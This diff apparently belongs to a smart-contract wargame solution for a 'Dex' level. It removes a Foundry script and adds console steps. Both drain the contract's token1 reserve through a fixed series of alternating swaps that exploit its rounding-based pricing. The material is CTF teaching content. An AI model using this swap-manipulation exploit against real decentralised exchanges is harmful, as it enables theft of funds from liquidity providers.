@@ -1,26 +1,6 @@
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
-
-import "forge-std/Script.sol";
-import "../instances/Ilevel22.sol";
-
-contract POC is Script {
-
-    Dex level22 = Dex(/* address here */);
-    function run() external{
-        vm.startBroadcast();
-        level22.approve(address(level22), 500);
-        address token1 = level22.token1();
-        address token2 = level22.token2();
-
-        level22.swap(token1, token2, 10);
-        level22.swap(token2, token1, 20);
-        level22.swap(token1, token2, 24);
-        level22.swap(token2, token1, 30);
-        level22.swap(token1, token2, 41);
-        level22.swap(token2, token1, 45);
-
-        console.log("Final token1 balance of Dex is : ", level22.balanceOf(token1, address(level22)));
-        vm.stopBroadcast();
-    }
-}
+1. get the contract instance;
+2. enter t1 = await contract.token1() - this would get the address for token 1;
+3. enter t2 = await contract.token2() - again address for token 2;
+4. now for the most important step - you'll have to conduct multiple swaps between currencies. Given that the price of swaps are governed inside the contract, rounding errors mean you will receive more tokens as you exchange them with the other token.
+5. After you have completely drained token1 of its balances, use: await contract.balanceOf(t1, instance).then(v => v.toString()) to verify that the amount contained in the balance is 0;
+6. submit the instance.
